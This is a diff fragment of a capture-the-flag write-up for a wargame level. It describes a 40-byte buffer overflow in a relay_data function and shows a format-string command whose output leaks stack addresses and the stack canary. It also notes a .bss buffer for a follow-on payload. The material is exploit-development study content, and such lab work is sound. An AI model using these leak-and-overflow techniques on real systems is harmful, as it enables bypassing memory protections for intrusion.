@@ -18,10 +18,12 @@ Same protections as level07.
 In the `relay_data` function, there is a buffer of 40 bytes, in which we can read 64 bytes, allowing to overflow.
 There is a canary check, after this buffer, we need to put its value here. It is at the 17th position
 
+```shell
 level08@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%p "*20)' | ./maelcum
   [ZION] Maelcum speaks.
   [MAELCUM] Relay node — Babylon not.
 [MAELCUM] Tag this relay (who's asking?): [MAELCUM] Logging relay tag: 0x7fffffffe080 (nil) (nil) 0x7ffff7e04b20 0x410 (nil) 0x3c 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x20702520 (nil) `0xcce67c475b0a9200` 0x7fffffffe2b0 0x401821 0x7fffffffe390
+```
 
 Also, there is a buffer of 512 bytes that we can use, because the 16 bytes left are not enough to put all the operations after. Its address is 0x404200, which is in the .bss part of the memory (non executable)
 
